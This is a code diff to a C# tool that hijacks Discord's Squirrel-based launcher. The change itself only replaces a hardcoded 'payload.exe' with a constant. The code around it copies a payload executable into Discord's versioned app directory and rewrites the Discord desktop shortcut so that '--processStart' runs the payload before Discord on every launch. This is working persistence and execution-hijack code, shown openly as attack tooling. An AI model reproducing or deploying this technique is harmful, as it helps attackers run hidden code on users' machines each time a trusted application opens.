@@ -10,6 +10,7 @@ namespace SquirrelFramework
         public static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         public static readonly string AppName = "Discord";
+        public static readonly string PayloadName = "Payload.exe";
 
         static void Main(string[] args)
         {
@@ -68,7 +69,7 @@ namespace SquirrelFramework
 
             // change shortcut arguments
             var shortcut = new IWshShell_Class().CreateShortcut(shortcutPath) as IWshShortcut;
-            shortcut.Arguments = $"--processStart \"payload.exe\" --process-start-args \"{AppName}.exe\"";
+            shortcut.Arguments = $"--processStart \"{PayloadName}\" --process-start-args \"{AppName}.exe\"";
             shortcut.Save();
 
             return true;
@@ -76,12 +77,12 @@ namespace SquirrelFramework
 
         static bool CopyPayloadToDirectory(string discordPath, string version)
         {
-            string payloadPath = "payload.exe";
+            string payloadPath = PayloadName;
             string appDirectory = Path.Combine(discordPath, $"app-{version}");
 
             if (Directory.Exists(appDirectory))
             {
-                System.IO.File.Copy(payloadPath, Path.Combine(appDirectory, "payload.exe"), true);
+                System.IO.File.Copy(payloadPath, Path.Combine(appDirectory, PayloadName), true);
                 return true;
             }
 
